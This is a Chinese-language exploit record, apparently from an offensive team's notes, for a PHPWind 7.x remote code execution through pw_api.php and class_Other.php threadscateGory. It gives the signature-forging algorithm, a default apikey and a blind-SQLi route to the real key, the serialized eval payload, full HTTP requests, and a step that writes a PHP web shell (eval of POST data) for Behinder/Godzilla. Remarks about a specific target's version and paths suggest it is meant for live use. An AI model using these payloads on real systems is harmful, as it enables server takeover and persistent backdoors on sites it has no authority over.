# PHPWind 7.x pw_api.php → api/class_Other.php threadscateGory 写码 RCE（wooyun-2010-0417 第二洞，7.5 SP3/8.x 已加 intval 修复）

- **code**: phpwind-7.x-pw_api.php-api-class_other.php-threadscategory-写码-rce-wooyun-2010-04
- **kind**: poc
- **category**: rce
- **component**: PHPWind
- **versions**: PHPWind 7.x（wooyun 原文：影响 phpwind 7 和 phpwind 8）。修复点：api/class_Other.php 的 $class['cid'] 在 7.5 SP3 加 intval()、在 8.7/intBoys-8/yuwenlan 为 (int)，全部已修。含 7.3.2（早于修复点，待实测文件存在性与未修形态）
- **language**: bash
- **source**: web
- **source_url**: https://target272.example.com/vuldb/ssvid-20095
- **verified_note**: 【情报角色零目标请求 —— 本条未在目标上发包验证】。源码级确证：① 调用链 run()→callback()→require_once+call_user_func_array 逐行读出（pw75sp3/api/class_base.php L70-123）；② sig 算法逐行读出（ksort + "key=value&" 跳过 sig 与空值 + md5(arg.apikey)）；③ pw_api.php 入参直接取 $_POST+$_GET，**不经 Char_cv/CheckVar**（与 pw_example.com 那条链相反，故 params 里引号可自由用）；④ 修复面确证：pw75sp3/pw75sp3_utf8 该处为 intval，old-blueday(8.7)/intBoys-8/yuwenlan 为 (int)，**五份源码全部已修**。**未确证项**：目标 7.3.2 的 pw_api.php 与 api/class_Other.php 是否存在、是否仍是未修形态。任务情报「api 全 404」指 api/ 目录直访，根目录 pw_api.php 必须单独确认（本机 6/7 份源码都有 pw_api.php）。
- **tags**: phpwind,7.3.2,rce,写码,pw_api,class_Other,threadscateGory,info_class,sig,apikey
- **created_at**: 2026-10-06T18:11:02.438Z
- **found_by**: exploit

## 描述

wooyun-2010-0417 第二洞。pw_api.php 的 app 模式经 sig 校验后，mode/method 直接调度到 api/class_Other.php 的 threadscateGory()，该方法把 $class['cid'] 用双引号插值写进 data/bbscache/info_class.php，写入即执行 —— 因 '$class[cid]' 在双引号串内插值，控制 $class['cid'] 为字符串即可注入任意 PHP 代码。需先拿到 apikey（db_siteownerid）。

## 用法

```
1) 步骤0（3 包）确认前置：curl -sk -o /dev/null -w '%{http_code} %{size_download}' 分别打
   /bbs/pw_api.php  /bbs/api/class_Other.php  /bbs/api/class_base.php
   pw_api.php 必须 200（不能是 404）；9 字节 Forbidden 也算存在（它自己 require 了 common.php 故可执行）
2) 拿 apikey：零成本先试默认种子值 43ad6aed9e1523ba169f562221480891；
   不行则用 02-pcdelimg-blind-sqli.py --name db_siteownerid --hex 盲注
3) 跑 runs/pw-rce-exp/03-pwapi-chain.sh <APIKEY> —— 脚本自动算 sig、写缓存、触发执行、验证回显
4) 失败判据：响应含 "Error Sign" => apikey 错；含 "Not Exists" => 文件/方法不存在（该版本已删或已修）
5) 需要替换的参数：APIKEY / BASE_URL
```

## 正文

```
api/class_base.php L70-123（调用链）：
  function run($request) {
      $request = $this->strips($request);          // stripslashes，不做 Char_cv
      if (isset($request['type']) && $request['type']=='uc') { $this->apikey = $GLOBALS['uc_key']; }
      else { $this->type='app'; $this->apikey = $GLOBALS['db_siteownerid']; }
      ksort($request); reset($request); $arg='';
      foreach ($request as $key=>$value) { if ($value && $key!='sig') { $arg .= "$key=$value&"; } }
      if (empty($this->apikey) || md5($arg . $this->apikey) != $request['sig'])
          return new ErrorMsg(API_SIGN_ERROR,'Error Sign');
      $mode = $request['mode']; $method = $request['method'];
      $params = isset($request['params']) ? unserialize($request['params']) : array();
      return $this->callback($mode,$method,$params);
  }
  function callback($mode,$method,$params) {
      if (!file_exists(R_P.'api/class_' . $mode . '.php')) return new ErrorMsg(API_MODE_NOT_EXISTS,"Class($mode) Not Exists");
      require_once Pcv(R_P.'api/class_' . $mode . '.php');     // ← 链三：$mode 未过滤
      if (!method_exists($this->classdb[$mode],$method)) return new ErrorMsg(API_METHOD_NOT_EXISTS,...);
      return @call_user_func_array(array(&$this->classdb[$mode], $method), $params);
  }

api/class_Other.php 未修形态（maddogfyg 版本无此文件；下列为 wooyun 原文形态）：
  function threadscateGory($classdb) {
      $classcache = "<?php\r\n\$info_class=array(\r\n";
      foreach ($classdb as $key => $class) {
          !$class['ifshow'] && $class['ifshow'] = '0';
          $classcache .= "'$class[cid]'=>".pw_var_export($class).",\r\n\r\n";   // ← '$class[cid]' 双引号插值
      }
      $classcache .= ");\r\n?>";
      writeover(D_P."data/bbscache/info_class.php",$classcache);
  }

已修形态对照（全部已修）：
  pw75sp3 / pw75sp3_utf8/api/class_Other.php L168   $class['cid'] = intval($class['cid']);
  old-blueday-phpwind(8.7) / intBoys-PHPWind-8 / yuwenlan-phpwind  L166   $class['cid'] = (int)$class['cid'];

params 序列化结构（$class['cid'] 为字符串 => 生成行变成 '' . eval(...) . 'abc' => eval 执行）：
  a:1:{s:3:"cid";a:1:{s:3:"cid";s:21:"'.eval($_GET[c]).'abc";}}

sig 计算：ARG = "method=threadscateGory&mode=Other&params=<PARAMS>&type=app&"
          SIG = md5(ARG . apikey)

完整请求原文：
GET /bbs/pw_api.php?mode=Other&method=threadscateGory&type=app&params=a%3A1%3A%7Bs%3A3%3A%22cid%22%3Ba%3A1%3A%7Bs%3A3%3A%22cid%22%3Bs%3A21%3A%22%27.eval%28%24_GET%5Bc%5D%29.%27abc%22%3B%7D%7D&sig=<MD5> HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.36 Safari/537.36

然后触发执行：
GET /bbs/data/bbscache/info_class.php?c=phpinfo(); HTTP/1.1
Host: example.com

落冰蝎/哥斯拉马（目标 file_put_contents 未被禁用）：
GET /bbs/data/bbscache/info_class.php?c=file_put_contents('x.php','<?php @eval($_POST[1]);?>'); HTTP/1.1
（open_basedir = 各站文档根 + /tmp，落点必须在文档根内）

落盘脚本：runs/pw-rce-exp/03-pwapi-chain.sh <APIKEY> [BASE_URL]
```
